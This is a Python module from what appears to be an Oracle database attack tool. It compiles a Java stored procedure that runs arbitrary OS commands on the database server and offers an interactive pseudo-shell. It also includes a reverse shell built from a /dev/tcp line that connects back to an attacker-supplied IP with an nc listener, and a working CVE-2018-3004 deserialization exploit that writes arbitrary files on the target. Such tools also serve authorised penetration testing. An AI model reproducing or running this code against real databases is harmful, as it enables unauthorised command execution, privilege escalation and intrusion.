#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging, subprocess
from threading import Thread
from Utils import checkOptionsGivenByTheUser,generateRandomString
from Constants import *

class Java (OracleDatabase):
	'''
	Allow to use Java remotly
	'''
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("Java object created")
		OracleDatabase.__init__(self,args)
		self.SOURCE_OS_COMMAND_CLASS = """
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
  import java.io.*;
  public class OSCommand {
    public static String executeCommand(String command) {
      StringBuffer sb = new StringBuffer();
      try {
        String[] finalCommand;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
          String systemRootvariable;
          try {systemRootvariable = System.getenv("SystemRoot");} 
          catch (ClassCastException e) {
	        systemRootvariable = System.getProperty("SystemRoot");
          }
          finalCommand = new String[4];
          finalCommand[0] = systemRootvariable+"\\\system32\\\cmd.exe";
          finalCommand[1] = "/y";
          finalCommand[2] = "/c";
          finalCommand[3] = command;
        } else { // Linux or Unix System
          finalCommand = new String[3];
          finalCommand[0] = "/bin/sh";
          finalCommand[1] = "-c";
          finalCommand[2] = command;
        }
        // Execute the command...
        final Process pr = Runtime.getRuntime().exec(finalCommand);
        pr.waitFor();
        // Capture output from STDOUT
        BufferedReader br_in = null;
        try {
          br_in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
          String buff = null;
          while ((buff = br_in.readLine()) != null) {
            sb.append(buff); sb.append("\\n");
            //try {Thread.sleep(100);} catch(Exception e) {}
          }
          br_in.close();
        } catch (IOException ioe) {
          sb.append("IOException in input stream: ").append(ioe.getMessage());
          System.out.println("Error printing process output.");
          ioe.printStackTrace();
        } finally {
          try {
            br_in.close();
          } catch (Exception ex) {}
        }
        // Capture output from STDERR
        BufferedReader br_err = null;
        try {
          br_err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
          String buff = null;
          while ((buff = br_err.readLine()) != null) {
            sb.append("stderr:");
            sb.append(buff);
            sb.append("\\n");
            //try {Thread.sleep(100);} catch(Exception e) {}
          }
          br_err.close();
        } catch (IOException ioe) {
          sb.append("IOException in error stream: ").append(ioe.getMessage());
          System.out.println("Error printing execution errors.");
          ioe.printStackTrace();
        } finally {
          try {
            br_err.close();
          } catch (Exception ex) {}
        }
      }
      catch (Exception ex) {
        sb.append("Exception: ").append(ex.getMessage());
        System.out.println(ex.getLocalizedMessage());
      }
      return sb.toString();
    }
  };"""
		self.SOURCE_OS_COMMAND_CREATE_FUNCTION = "CREATE OR REPLACE FUNCTION oscmd (p_command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'OSCommand.executeCommand (java.lang.String) return java.lang.String';"
		self.SOURCE_OS_COMMAND_EXEC = "select oscmd('{0}') from dual"
		self.SOURCE_DROP_CLASS = "DROP JAVA SOURCE \"OSCommand\""
		self.SOURCE_DROP_FUNCTION = "DROP FUNCTION oscmd"
		self.LINUX_CMD_ERROR = 'No such file or directory'
		self.JAVA_SESSION_CLEARED = "Java session state cleared"

	def createClassAndFunctionToExecOsCmd(self):
		'''
		CREATE AND COMPILE JAVA CLASS and CREATE FUNCTION TO CALL JAVA
		'''
		logging.info("Create and compile the java class")
		if "path-shell" in self.args:
			self.SOURCE_OS_COMMAND_CLASS = self.SOURCE_OS_COMMAND_CLASS.replace('"/bin/sh"','"'+self.args["path-shell"]+'"')
		status = self.__execPLSQL__(self.SOURCE_OS_COMMAND_CLASS)
		if isinstance(status,Exception):
			logging.info("Impossible to create and compile the java class: {0}".format(self.cleanError(status)))
			return status
		else : 
			logging.info("Create a function to call java")
			status = self.__execPLSQL__(self.SOURCE_OS_COMMAND_CREATE_FUNCTION)
			if isinstance(status,Exception):
				logging.info("Impossible to create function to call java: {0}".format(self.cleanError(status)))
				return status
			else : 
				return True
	
	def deleteClassAndFunctionToExecOsCmd(self):
		'''
		Delete the COMPILED JAVA CLASS and delete the CREATED FUNCTION
		'''
		logging.info("Delete the PL/SQL function created")
		status = self.__execPLSQL__(self.SOURCE_DROP_FUNCTION)
		if isinstance(status,Exception):
			logging.info("Impossible to drop the function: {0}".format(self.cleanError(status)))
			return status
		else: 
			logging.info("Delete the java class compiled")
			status = self.__execPLSQL__(self.SOURCE_DROP_CLASS)
			if isinstance(status,Exception):
				logging.info("Impossible to drop the class: {0}".format(self.cleanError(status)))
				return status
		return True

	def __runOSCmd__ (self,cmd,printResponse=True,retryNb=1):
		'''
		Run a OS command
		defineClassAndFunctionToExecOsCmd() must be run before this one
		return string  (stdout or stderr) or Exception
		'''
		logging.info("Execute the following command system remotly: {0}".format(cmd))
		data = self.__execQuery__(query=self.SOURCE_OS_COMMAND_EXEC.format(cmd),ld=[])
		if isinstance(data,Exception):
			logging.info("Impossible to execute the system command: {0}".format(str(data)))
			if self.JAVA_SESSION_CLEARED in str(data):
				if retryNb == 0 : return data
				logging.info("Run again the OS command...")
				return  self.__runOSCmd__ (cmd=cmd,printResponse=printResponse,retryNb=retryNb-1)
			return data
		if data[0][0] == None : 
			logging.info('The system command output is empty')
			return ''
		else : 
			logging.info('The system command output is: `{0}`...'.format(data[0][0][:100]))
			if printResponse == True : self.args['print'].printOSCmdOutput("{0}".format(data[0][0]))
			return data[0][0]

	def execOSCommand(self,cmd,printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True):
		'''
		Run a OS command
		'''
		if needCreateClassAndFunction == False :
			data = self.__runOSCmd__ (cmd=cmd,printResponse=printResponse)
		else :
			status = self.createClassAndFunctionToExecOsCmd()
			if status != True:
				self.args['print'].badNews("Impossible to use the JAVA library to execute a system command: {0}".format(str(status)))
				return status
			else:
				data = self.__runOSCmd__ (cmd=cmd,printResponse=printResponse)
				if needDeleteClassAndFunction == True :
					status = self.deleteClassAndFunctionToExecOsCmd()
					if status != True:
						self.args['print'].goodNews("Impossible to delete functions created: {0}".format(self.cleanError(status)))
		if isinstance(data,Exception) == False : return data

	def getInteractiveShell(self):
		'''
		Give an interactive shell to the user
		Return True if Ok, otherwise return False
		'''
		exit, needCreateClassFunctions = False, True
		while exit == False:
			try:
				if needCreateClassFunctions == True :
					status = self.createClassAndFunctionToExecOsCmd()
					if status == False:
						self.args['print'].badNews("Impossible to use the JAVA library to execute a system command: {0}".format(str(status)))
						return False
					needCreateClassFunctions = False
				else :
					cmd = raw_input('{0}$ '.format(self.args['server']))
					output = self.execOSCommand(cmd=cmd,printResponse=True, needCreateClassAndFunction = False, needDeleteClassAndFunction = False)
			except KeyboardInterrupt:
				status = self.deleteClassAndFunctionToExecOsCmd()
				if status != True:
					self.args['print'].badNews("Impossible to delete functions created: {0}".format(self.cleanError(status)))
				return True
		return False

	def __runListenNC__ (self,port=None):
		'''
		nc listen on the port
		'''
		try :
			subprocess.call("nc -l -v -p {0}".format(port), shell=True)
		except KeyboardInterrupt: pass

	def giveReverseShell(self, localip, localport):
		'''
		Give a reverse tcp shell via nc
		Need upload nc.exe if the remote system is windows
		'''
		if self.remoteSystemIsWindows() == True :
			logging.warn("Java reverse shell is not implement for Windows yet")
		elif self.remoteSystemIsLinux() == True :
			CMD = "exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done".format(localip,localport)
			self.args['print'].goodNews("The reverse shell try to connect to {0}:{1}".format(localip,localport))
			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
			a.start()
			try :
				self.execOSCommand(cmd=CMD,printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True)
			except KeyboardInterrupt: 
				self.args['print'].goodNews("Connection closed")
		else :
			logging.error("The remote server OS ({0}) is unknown".format(self.remoteOS.lower()))
		
	####################################################################################################################
	#						Privilege escalation via CVE-2018-3004
	#
	#	Exploit: http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html
	#
	#	"Vulnerability in the Java VM component of Oracle Database Server. 
	#	 Supported versions that are affected are 11.2.0.4, 12.1.0.2,12.2.0.1 and 18.2. 
	#	 Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. 
	#	 Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java VM accessible data. 
	#	 CVSS 3.0 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N)."
	#
	#   "The Oracle bug for this vulnerability is Bug 27923353, and the patch is for the OJVM system.  
	#	 For this POC, the proper patch is OJVM release update 12.2.0.1.180717 (p27923353_122010_Linux-x86-64.zip)"
	####################################################################################################################
	
	def createOrAppendFileViaCVE_2018_3004(self, data, remoteFilename):
		'''
		Exploit CVE-2018-3004
		write data in remoteFilename on the target
		If file does not exist, it is created.
		Otherwise, data are appended in remoteFilename.
		'''
		CREATE_CLASS_EXPLOIT = """
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "exploitDeserializationJava" AS
import java.io.*;
import java.beans.*;
public class exploitDeserializationJava{
	public static void input(String xml) throws InterruptedException, IOException {   
		XMLDecoder decoder = new XMLDecoder ( new ByteArrayInputStream(xml.getBytes()));
		Object object = decoder.readObject();
		System.out.println(object.toString());
		decoder.close();        
	}
};
		"""
		CREATE_FUNCTION_EXPLOIT ="CREATE OR REPLACE PROCEDURE exploitDeserialization (xmlcode IN VARCHAR2) IS language java name 'exploitDeserializationJava.input(java.lang.String)';"
		EXECUTE_FUNCTION = "BEGIN exploitDeserialization('{0}'); END;"
		XML_CODE = '<java class="java.beans.XMLDecoder" version="1.4.0"><object class="java.io.FileWriter"><string>{0}</string><boolean>True</boolean><void method="write"><string>{1}</string></void><void method="close"/></object></java>' #{0}:Filename on the target, {1}: data to write on the file
		SOURCE_DROP_CLASS = "DROP JAVA SOURCE \"exploitDeserializationJava\""
		SOURCE_DROP_FUNCTION = "DROP PROCEDURE exploitDeserialization"
		
		logging.info("Trying to write {0} in {1} on the target".format(repr(data), remoteFilename))
		logging.info("Create and compile the java class")
		status = self.__execPLSQL__(CREATE_CLASS_EXPLOIT)
		if isinstance(status,Exception):
			logging.info("Impossible to create and compile the java class: {0}".format(self.cleanError(status)))
			return status
		else :
			logging.debug("Java class created")
			logging.info("Create a stored procedure to call java")
			status = self.__execPLSQL__(CREATE_FUNCTION_EXPLOIT)
			if isinstance(status,Exception):
				logging.info("Impossible to create function to call java: {0}".format(self.cleanError(status)))
				return status
			logging.debug("Stored procedure created")
			xmlCode = XML_CODE.format(remoteFilename, data)
			logging.info("Executing the function with the xml code: {0}".format(xmlCode))
			status = self.__execPLSQL__(EXECUTE_FUNCTION.format(xmlCode))
			if isinstance(status, Exception):
				logging.info("Impossible to execute the stored procedure named '{0}': {1}".format(EXECUTE_FUNCTION.format(xmlCode), self.cleanError(status)))
				return status
			logging.info("Delete the PL/SQL PROCEDURE created")
			status = self.__execPLSQL__(SOURCE_DROP_FUNCTION)	
			if isinstance(status,Exception):
				logging.info("Impossible to drop the function: {0}".format(self.cleanError(status)))
			else: 
				logging.info("Delete the java class compiled")
				status = self.__execPLSQL__(SOURCE_DROP_CLASS)
				if isinstance(status,Exception):
					logging.info("Impossible to drop the class: {0}".format(self.cleanError(status)))
			return True

	def testAll (self):
		'''
		Test all functions
		'''
		command = self.__generateRandomString__()
		self.args['print'].subtitle('JAVA library ?')
		logging.info("Try to use JAVA in order to execute the following random command: {0}".format(command))
		status = self.createClassAndFunctionToExecOsCmd()
		if status != True:
			self.args['print'].badNews("KO")
		else:
			data = self.__runOSCmd__ (command,printResponse=False)
			if data == '':
				logging.info("The system command {0} return no error, it's impossible with this random command".format(command))
				self.args['print'].badNews("KO")
			else : 
				self.args['print'].goodNews("OK")
				status = self.deleteClassAndFunctionToExecOsCmd()
				if status != True:
					self.args['print'].info("Impossible to delete functions created: {0}".format(self.cleanError(status)))
				logging.info("The attacker can create a Java Stored Procedure. Perhaps he can exploit CVE-2018-3004 ('Oracle Privilege Escalation via Deserialization')...")
				self.args['print'].subtitle("Bypass built in Oracle JVM security (CVE-2018-3004)?")
				remoteFileName = generateRandomString()
				if self.remoteSystemIsLinux() == True:
					status = self.createOrAppendFileViaCVE_2018_3004(data=generateRandomString(),remoteFilename='/tmp/'+remoteFileName)
				else:
					status = self.createOrAppendFileViaCVE_2018_3004(data=generateRandomString(),remoteFilename='%temp%\\'+remoteFileName)
				if status == True:
					self.args['print'].goodNews("OK")
				else:
					self.args['print'].badNews("KO")
				
def runjavaModule(args):
	'''
	Run the JAVA module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module", "shell", "reverse-shell", "exec", "create-file-CVE-2018-3004"]) == False : return EXIT_MISS_ARGUMENT
	java = Java(args)
	status = java.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if the DBMSScheduler library can be used")
		status = java.testAll()
	#Option 1: exec
	if args['exec'] != None:
		args['print'].title("Execute the `{0}` on the {1} server".format(args['exec'],args['server']))
		status = java.execOSCommand(cmd=args['exec'],printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True)
	#Option 2: shell
	if args['shell'] == True:
		args['print'].title("Try to give you a pseudo shell to the {0} server".format(args['server']))
		java.getInteractiveShell()
	#Option 3: reverse shell
	if args['reverse-shell'] != None :
		args['print'].title("Try to give you a nc reverse shell from the {0} server".format(args['server']))
		java.giveReverseShell(localip=args['reverse-shell'][0],localport=args['reverse-shell'][1])
	#Option 4: Bypass built in Oracle JVM security through Deserialization (CVE-2018-3004)
	if args['create-file-CVE-2018-3004'] != None :
		args['print'].title("Try to create the file {0} on {1}".format(args['create-file-CVE-2018-3004'][1],args['server']))
		status = java.createOrAppendFileViaCVE_2018_3004(data=args['create-file-CVE-2018-3004'][0], remoteFilename=args['create-file-CVE-2018-3004'][1])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to create the file {0}: {1}".format(args['create-file-CVE-2018-3004'][1], status))
		elif status==True: 
			args['print'].goodNews("The file {0} has been created on the target with data '{1}'".format(args['create-file-CVE-2018-3004'][1], args['create-file-CVE-2018-3004'][0]))
	java.close()
				

